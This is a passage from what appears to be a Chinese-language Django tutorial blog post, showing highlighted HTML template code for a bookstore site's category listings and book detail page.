class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'books:detail' books_id=book.id  %&#125;"</span>&gt;</span>&#123;&#123; book.name &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'books:detail' books_id=book.id  %&#125;"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&#123;% static book.image %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"price"</span>&gt;</span>¥ &#123;&#123; book.price &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                &#123;% endfor %&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"list_model"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"list_title clearfix"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">"fl"</span> <span class="attr">id</span>=<span class="string">"model02"</span>&gt;</span>Javascript<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"subtitle fl"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span>&gt;</span>|<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                &#123;% for book in javascript_new %&#125;</span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>&#123;&#123; book.name &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                &#123;% endfor %&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">class</span>=<span class="string">"book_more fr"</span>&gt;</span>查看更多 &gt;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"book_con clearfix"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"book_banner fl"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'images/banner02.jpg' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"book_list fl"</span>&gt;</span></span><br><span class="line">                &#123;% for book in javascript_hot %&#125;</span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">h4</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>&#123;&#123; book.name &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&#123;% static book.image %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"price"</span>&gt;</span>¥ &#123;&#123; book.price &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                &#123;% endfor %&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"list_model"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"list_title clearfix"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">"fl"</span> <span class="attr">id</span>=<span class="string">"model03"</span>&gt;</span>数据结构与算法<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"subtitle fl"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span>&gt;</span>|<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                &#123;% for book in algorithms_new %&#125;</span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>&#123;&#123; book.name &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                &#123;% endfor %&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">class</span>=<span class="string">"book_more fr"</span>&gt;</span>查看更多 &gt;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"book_con clearfix"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"book_banner fl"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'images/banner03.jpg' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"book_list fl"</span>&gt;</span></span><br><span class="line">                &#123;% for book in algorithms_hot %&#125;</span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">h4</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>&#123;&#123; book.name &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&#123;% static book.image %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"price"</span>&gt;</span>¥ &#123;&#123; book.price &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                &#123;% endfor %&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"list_model"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"list_title clearfix"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">"fl"</span> <span class="attr">id</span>=<span class="string">"model04"</span>&gt;</span>机器学习<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"subtitle fl"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span>&gt;</span>|<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                &#123;% for book in machinelearning_new %&#125;</span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>&#123;&#123; book.name &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                &#123;% endfor %&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">class</span>=<span class="string">"book_more fr"</span>&gt;</span>查看更多 &gt;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"book_con clearfix"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"book_banner fl"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'images/banner04.jpg' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"book_list fl"</span>&gt;</span></span><br><span class="line">                &#123;% for book in machinelearning_hot %&#125;</span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">h4</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>&#123;&#123; book.name &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&#123;% static book.image %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"price"</span>&gt;</span>¥ &#123;&#123; book.price &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                &#123;% endfor %&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"list_model"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"list_title clearfix"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">"fl"</span> <span class="attr">id</span>=<span class="string">"model05"</span>&gt;</span>操作系统<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"subtitle fl"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span>&gt;</span>|<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                &#123;% for book in operatingsystem_new %&#125;</span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>&#123;&#123; book.name &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                &#123;% endfor %&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">class</span>=<span class="string">"book_more fr"</span>&gt;</span>查看更多 &gt;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"book_con clearfix"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"book_banner fl"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'images/banner05.jpg' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"book_list fl"</span>&gt;</span></span><br><span class="line">                &#123;% for book in operatingsystem_hot %&#125;</span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">h4</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>&#123;&#123; book.name &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&#123;% static book.image %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"price"</span>&gt;</span>¥ &#123;&#123; book.price &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                &#123;% endfor %&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"list_model"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"list_title clearfix"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">"fl"</span> <span class="attr">id</span>=<span class="string">"model06"</span>&gt;</span>数据库<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"subtitle fl"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span>&gt;</span>|<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                &#123;% for book in database_new %&#125;</span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>&#123;&#123; book.name &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                &#123;% endfor %&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">class</span>=<span class="string">"book_more fr"</span>&gt;</span>查看更多 &gt;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"book_con clearfix"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"book_banner fl"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'images/banner06.jpg' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"book_list fl"</span>&gt;</span></span><br><span class="line">                &#123;% for book in database_hot %&#125;</span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">h4</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>&#123;&#123; book.name &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&#123;% static book.image %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"price"</span>&gt;</span>¥ &#123;&#123; book.price &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                &#123;% endfor %&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;% endblock body %&#125;</span><br></pre></td></tr></table></figure></p><p>改写detail.html<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'base.html' %&#125;</span><br><span class="line">&#123;% load staticfiles %&#125;</span><br><span class="line">&#123;% block title %&#125;尚硅谷书店-首页&#123;% endblock title %&#125;</span><br><span class="line">&#123;% block body %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"navbar_con"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"navbar clearfix"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"subnav_con fl"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h1</span>&gt;</span>全部商品分类<span class="tag">&lt;/<span class="name">h1</span>&gt;</span> </span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>           </span><br><span class="line">                <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"subnav"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">class</span>=<span class="string">"python"</span>&gt;</span>Python<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">class</span>=<span class="string">"javascript"</span>&gt;</span>Javascript<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">class</span>=<span class="string">"algorithms"</span>&gt;</span>数据结构与算法<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">class</span>=<span class="string">"machinelearning"</span>&gt;</span>机器学习<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">class</span>=<span class="string">"operatingsystem"</span>&gt;</span>操作系统<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">class</span>=<span class="string">"database"</span>&gt;</span>数据库<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"navlist fl"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"interval"</span>&gt;</span>|<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>移动端书城<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"interval"</span>&gt;</span>|<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>秒杀<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"breadcrumb"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>全部分类<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span>&gt;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Python<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span>&gt;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>商品详情<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"book_detail_con clearfix"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"book_detail_pic fl"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&#123;% static books.image %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"book_detail_list fr"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h3</span>&gt;</span>&#123;&#123; books.name &#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; books.desc &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"price_bar"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"show_pirze"</span>&gt;</span>¥<span class="tag">&lt;<span class="name">em</span>&gt;</span>&#123;&#123; books.price &#125;&#125;<span class="tag">&lt;/<span class="name">em</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"show_unit"</span>&gt;</span>单  位：&#123;&#123; books.unit &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"book_num clearfix"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"num_name fl"</span>&gt;</span>数 量：<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"num_add fl"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"num_show fl"</span> <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:;"</span> <span class="attr">class</span>=<span class="string">"add fr"</span>&gt;</span>+<span 